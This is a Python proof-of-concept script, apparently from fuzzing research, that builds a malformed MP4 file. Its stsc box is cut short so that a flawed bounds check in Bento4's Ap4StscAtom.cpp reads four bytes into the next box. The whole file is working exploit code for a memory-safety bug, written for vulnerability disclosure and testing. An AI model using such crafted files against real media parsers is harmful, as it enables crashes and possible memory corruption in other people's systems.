#!/usr/bin/env python3
"""
PoC generator for VULN 003: Bento4 Ap4StscAtom.cpp OOB read
stsc box with size=24, entry_count=1 but only 8 bytes of entry data.
The parser uses AP4_ATOM_HEADER_SIZE=8 instead of AP4_FULL_ATOM_HEADER_SIZE=12
for its bounds check, so it accepts the box and reads 12 bytes for the entry,
crossing 4 bytes into the next box (stco), using stco's size field as
sample_description_index.

Bounds check flaw:
  Correct: (24-12-4)/12 = 0 < 1  -> should REJECT
  Actual:  (24-8-4)/12  = 1 >= 1 -> PASSES, reads 12B, 4B from stco
"""
import struct
import os

OUTPUT = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4_h/vuln_003.mp4"


def box(box_type, data):
    """Build a standard MP4 box: size(4B BE) + type(4B) + data"""
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data


def full_box(box_type, version, flags, data):
    """Build a FullBox: size(4B) + type(4B) + version(1B) + flags(3B) + data"""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return box(box_type, header + data)


# ---- Malicious stsc box (size=24) ----
# Full atom header: size(4) + type(4) + version(1) + flags(3) = 12 bytes
# entry_count field: 4 bytes
# Partial entry: first_chunk(4) + samples_per_chunk(4) = 8 bytes  (missing sample_description_index)
# Total: 12 + 4 + 8 = 24 bytes
stsc_entry_partial = struct.pack(">II", 1, 1)  # first_chunk=1, samples_per_chunk=1
stsc_header = struct.pack(">I", 24) + b"stsc"   # size=24, type='stsc'
stsc_version_flags = b"\x00\x00\x00\x00"         # version=0, flags=0
stsc_entry_count = struct.pack(">I", 1)          # entry_count=1
stsc = stsc_header + stsc_version_flags + stsc_entry_count + stsc_entry_partial
assert len(stsc) == 24, f"stsc size should be 24, got {len(stsc)}"

# ---- stco box (full atom, entry_count=0, size=16) ----
# Its first 4 bytes (\x00\x00\x00\x10 = 16) will be read as sample_description_index
# of the stsc entry. index=16 is out of bounds for the sample description table,
# which could cause a downstream crash or invalid memory access.
stco = full_box(b"stco", 0, 0, struct.pack(">I", 0))  # entry_count=0
assert len(stco) == 16, f"stco size should be 16, got {len(stco)}"
# Verify the first 4 bytes of stco (size field = 16 = 0x00000010)
assert stco[:4] == b"\x00\x00\x00\x10"

# ---- stsz: full atom, sample_size=0, sample_count=0 ----
stsz = full_box(b"stsz", 0, 0, struct.pack(">II", 0, 0))

# ---- stts: full atom, entry_count=0 ----
stts = full_box(b"stts", 0, 0, struct.pack(">I", 0))

# ---- stsd: full atom, entry_count=0 ----
stsd = full_box(b"stsd", 0, 0, struct.pack(">I", 0))

# ---- stbl box: stsd + stts + stsc (malicious) + stco + stsz ----
stbl_data = stsd + stts + stsc + stco + stsz
stbl = box(b"stbl", stbl_data)

# ---- smhd: full atom, 16 bytes (balance=0, reserved=0) ----
smhd = full_box(b"smhd", 0, 0, struct.pack(">HH", 0, 0))
assert len(smhd) == 16

# ---- dref with one url self-contained entry ----
url_entry = full_box(b"url ", 0, 1, b"")
dref_payload = struct.pack(">I", 1) + url_entry  # entry_count=1
dref = full_box(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)

# ---- minf box ----
minf_data = smhd + dinf + stbl
minf = box(b"minf", minf_data)

# ---- mdhd: full atom, version=0, 32 bytes total ----
mdhd_payload = struct.pack(">IIII", 0, 0, 44100, 0) + struct.pack(">HH", 0x55C4, 0)
mdhd = full_box(b"mdhd", 0, 0, mdhd_payload)
assert len(mdhd) == 32, f"mdhd length {len(mdhd)}"

# ---- hdlr: full atom, handler='soun' ----
hdlr_payload = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"SoundHandler\x00"
hdlr = full_box(b"hdlr", 0, 0, hdlr_payload)

# ---- mdia box ----
mdia_data = mdhd + hdlr + minf
mdia = box(b"mdia", mdia_data)

# ---- tkhd: full atom, version=0, 92 bytes total ----
tkhd_payload = (
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +
    b"\x00" * 8 +
    struct.pack(">hhhh", 0, 0, 0x0100, 0) +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    struct.pack(">II", 0, 0)
)
tkhd = full_box(b"tkhd", 0, 3, tkhd_payload)
assert len(tkhd) == 92, f"tkhd length {len(tkhd)}"

# ---- trak box ----
trak_data = tkhd + mdia
trak = box(b"trak", trak_data)

# ---- mvhd: full atom, version=0, 108 bytes total ----
mvhd_payload = (
    struct.pack(">IIII", 0, 0, 1000, 0) +
    struct.pack(">I", 0x00010000) +
    struct.pack(">H", 0x0100) +
    b"\x00" * 10 +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    b"\x00" * 24 +
    struct.pack(">I", 2)
)
mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)
assert len(mvhd) == 108, f"mvhd length {len(mvhd)}"

# ---- moov box ----
moov_data = mvhd + trak
moov = box(b"moov", moov_data)

# ---- ftyp box (16 bytes) ----
ftyp = box(b"ftyp", b"M4A " + struct.pack(">I", 0))
assert len(ftyp) == 16

# ---- Assemble file ----
mp4 = ftyp + moov

os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
with open(OUTPUT, "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
print(f"[+] stsc box: size=24, entry_count=1, only 8 bytes of entry data")
print(f"[+] stco box starts at offset {len(ftyp)+len(moov)-len(stco)-len(stsz)}")
print(f"[+] stco size field = 0x{struct.unpack('>I', stco[:4])[0]:08x} = {struct.unpack('>I', stco[:4])[0]}")
print(f"[+] Expected: OOB read, sample_description_index read from stco size field = {struct.unpack('>I', stco[:4])[0]}")
print(f"[+] If desc[index-1] accessed with index=16, may cause downstream invalid access")
